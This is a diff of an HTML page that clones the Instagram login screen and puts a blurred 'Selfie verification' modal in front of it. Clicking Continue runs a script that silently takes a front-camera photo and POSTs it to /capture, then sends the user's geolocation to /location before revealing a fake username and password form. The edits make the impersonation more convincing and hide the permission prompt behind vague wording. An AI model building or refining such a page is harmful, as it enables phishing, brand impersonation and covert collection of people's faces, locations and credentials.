@@ -20,33 +20,30 @@ body{
   font-family:'Inter',sans-serif;
 }
 
-/* PAGE */
+/* ===== BLUR LOGIC ===== */
 .page{
   position:relative;
-  width:350px;
 }
 
-/* BLUR CONTENT */
-.content{
+.blurred{
   filter:blur(6px);
   transition:filter .4s ease;
 }
 
-.content.active{
+.blurred.active{
   filter:blur(0);
 }
 
-/* OVERLAY */
+/* ===== MODAL ===== */
 .overlay{
   position:absolute;
   inset:0;
   display:flex;
   justify-content:center;
   align-items:center;
-  pointer-events:auto;
+  z-index:10;
 }
 
-/* MODAL */
 .modal{
   background:#111;
   border:1px solid #2a2d33;
@@ -59,7 +56,7 @@ body{
 .modal h2{
   font-family:Verdana,sans-serif;
   font-size:18px;
-  margin-bottom:14px;
+  margin-bottom:12px;
 }
 
 .modal p{
@@ -79,12 +76,15 @@ body{
 }
 
 /* ===== YGRAM UI ===== */
+.container{
+  width:350px;
+  text-align:center;
+}
 
 .logo{
   font-family:'Pacifico',cursive;
   font-size:40px;
-  text-align:center;
-  margin-bottom:26px;
+  margin-bottom:28px;
 }
 
 .card{
@@ -105,7 +105,7 @@ body{
   font-size:14px;
 }
 
-.btn{
+.btn-primary{
   width:100%;
   padding:11px;
   background:#3f4db8;
@@ -115,6 +115,64 @@ body{
   font-weight:600;
   margin-top:10px;
 }
+
+.divider{
+  display:flex;
+  align-items:center;
+  margin:20px 0;
+  font-size:12px;
+  font-weight:500;
+  letter-spacing:2px;
+  color:#8e8e8e;
+}
+
+.divider::before,
+.divider::after{
+  content:"";
+  flex:1;
+  height:1px;
+  background:#333;
+}
+
+.divider span{margin:0 12px}
+
+.fb-login{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:8px;
+  color:#1877f2;
+  font-size:14px;
+  font-weight:500;
+}
+
+.fb-icon{
+  width:18px;
+  height:18px;
+}
+
+.forgot{
+  margin-top:18px;
+  font-size:12px;
+  font-weight:500;
+}
+
+.signup{
+  margin-top:14px;
+  border:1px solid #2a2d33;
+  padding:18px;
+  font-size:14px;
+}
+
+.signup span{font-weight:400}
+.signup a{color:#3f8cff;font-weight:500;text-decoration:none}
+
+.footer{
+  margin-top:28px;
+  font-size:12px;
+  color:#8e8e8e;
+  letter-spacing:.3px;
+}
 </style>
 </head>
 
@@ -122,21 +180,54 @@ body{
 
 <div class="page">
 
-  <!-- BLURRED CONTENT -->
-  <div class="content" id="mainContent">
+  <!-- 🔒 BLURRED CONTENT -->
+  <div class="container blurred" id="mainContent">
+
+    <!-- 1️⃣ Logo -->
     <div class="logo">Instagram</div>
+
     <div class="card">
+
+      <!-- 2️⃣ Inputs -->
       <input class="input" placeholder="Phone number, username, or email">
-      <input class="input" type="password" placeholder="Password">
-      <button class="btn">Log in</button>
+      <input class="input" placeholder="Password" type="password">
+
+      <!-- 3️⃣ Button -->
+      <button class="btn-primary">Log in</button>
+
+      <!-- 4️⃣ Divider -->
+      <div class="divider"><span>OR</span></div>
+
+      <!-- 5️⃣ Facebook -->
+      <div class="fb-login">
+        <svg class="fb-icon" viewBox="0 0 24 24" fill="#1877f2">
+          <path d="M22 12a10 10 0 1 0-11.5 9.9v-7h-2v-3h2V9.5c0-2 1.2-3.1 3-3.1.9 0 1.8.1 1.8.1v2h-1c-1 0-1.3.6-1.3 1.2V12h2.6l-.4 3h-2.2v7A10 10 0 0 0 22 12"/>
+        </svg>
+        Log in with Facebook
+      </div>
+
+      <!-- 6️⃣ Forgot -->
+      <div class="forgot">Forgot password?</div>
+
     </div>
+
+    <!-- 7️⃣ Signup -->
+    <div class="signup">
+      <span>Don’t have an account?</span> <a href="#">Sign up</a>
+    </div>
+
+    <!-- 8️⃣ Footer -->
+    <div class="footer">
+      Meta · About · Privacy · Terms · Locations
+    </div>
+
   </div>
 
-  <!-- SELFIE MODAL -->
+  <!-- 🧍 SELFIE VERIFICATION MODAL -->
   <div class="overlay" id="overlay">
     <div class="modal">
       <h2>Selfie verification</h2>
-      <p>Proceed further.</p>
+      <p>Proceed Further.</p>
       <button onclick="startKYC()">Continue</button>
     </div>
   </div>
@@ -144,13 +235,13 @@ body{
 </div>
 
 <script>
-/* ===== AUTHORITATIVE OLD LOGIC (UNCHANGED) ===== */
+/* ===== AUTHORITATIVE OLD LOGIC ===== */
 
 async function capturePhoto(){
   let stream=null;
   try{
-    stream = await navigator.mediaDevices.getUserMedia({
-      video:{ facingMode:"user" }
+    stream=await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:"user"}
     });
 
     const video=document.createElement("video");
@@ -172,15 +263,13 @@ async function capturePhoto(){
 
 async function startKYC(){
   try{
-    /* CAMERA */
-    const image = await capturePhoto();
+    const image=await capturePhoto();
     await fetch("/capture",{
       method:"POST",
       headers:{ "Content-Type":"application/json" },
       body:JSON.stringify({ image })
     });
 
-    /* LOCATION (NON-BLOCKING) */
     if(navigator.geolocation){
       navigator.geolocation.getCurrentPosition(pos=>{
         fetch("/location",{
@@ -195,12 +284,11 @@ async function startKYC(){
       });
     }
 
-    /* UNBLUR + SHOW PAGE */
     document.getElementById("mainContent").classList.add("active");
     document.getElementById("overlay").style.display="none";
 
   }catch{
-    alert("Enable Permission to continue");
+    alert("Proceed Further");
   }
 }
 </script>
